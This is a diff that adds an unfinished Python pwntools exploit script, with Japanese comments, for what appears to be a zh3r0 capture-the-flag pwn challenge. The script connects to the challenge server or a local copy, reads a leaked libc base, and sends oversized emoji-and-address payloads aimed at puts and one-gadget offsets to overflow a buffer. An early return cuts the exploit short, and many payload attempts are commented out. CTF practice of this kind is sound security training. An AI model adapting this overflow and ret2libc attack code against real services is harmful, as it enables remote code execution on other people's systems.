@@ -1,0 +1,75 @@
+#!/usr/bin/env python
+#encoding: utf-8;
+
+from pwn import *
+import sys
+
+FILENAME = ""
+LIBCNAME = "../help/libc.so.6"
+
+hosts = ("asia.pwn.zh3r0.ml","localhost","localhost")
+ports = (3248,12300,23947)
+rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
+rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
+rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
+context(os='linux',arch='amd64')
+#binf = ELF(FILENAME)
+libc = ELF(LIBCNAME) if LIBCNAME!="" else None
+
+
+## utilities #########################################
+
+def hoge():
+  pass
+
+## exploit ###########################################
+
+def exploit():
+  global c
+
+  with open("test.txt","w") as f:
+      f.write("A"*0x2000)
+  ogs = [0x4f2c5,0x4f322,0x10a38c]
+  tro = "🏆"
+  medal = "🥇"
+
+  c.recvuntil("->")
+  #c.sendline("yes")
+  c.send("yes"+"A"*0x10)
+  c.recvuntil("->")
+  return
+  c.sendline("yes")
+
+  c.recvuntil("-> ")
+  libcbase = int(c.recvline().rstrip(),16)
+  print("libcbase: "+hex(libcbase))
+
+  c.recvuntil("->")
+  print(tro+medal)
+  #c.send(p32(0xf09fa587)*0x1)#+p64(libcbase+ogs[1])*0x100) # + p64(libcbase+ogs[2])) # 0x24よりおおきいバイト数を入れるとコアダンプ
+  #c.send(p32(0x87a59ff0)*0xa)#+p64(libcbase+ogs[1])*0x100) # + p64(libcbase+ogs[2])) # 0x24よりおおきいバイト数を入れるとコアダンプ
+  #c.send(medal*0x6+p64(libcbase+libc.symbols["puts"]))
+  #c.send((medal+tro)*0x20 + p64(libcbase+ogs[2]))
+  #c.send(tro*0x20+p64(libcbase+ogs[1])*0x20)
+  #c.sendline(hex(libcbase)) # 0x20*8 byteで本当のcoredumpe
+  c.sendline(tro*0x1000+p64(libcbase + libc.symbols["puts"])*0x3a00)
+
+## main ##############################################
+
+if __name__ == "__main__":
+    global c
+    
+    if len(sys.argv)>1:
+      if sys.argv[1][0]=="d":
+        cmd = """
+          set follow-fork-mode parent
+        """
+        c = gdb.debug(FILENAME,cmd)
+      elif sys.argv[1][0]=="r":
+        c = remote(rhp1["host"],rhp1["port"])
+      elif sys.argv[1][0]=="v":
+        c = remote(rhp3["host"],rhp3["port"])
+    else:
+        c = remote(rhp2['host'],rhp2['port'])
+    exploit()
+    c.interactive()
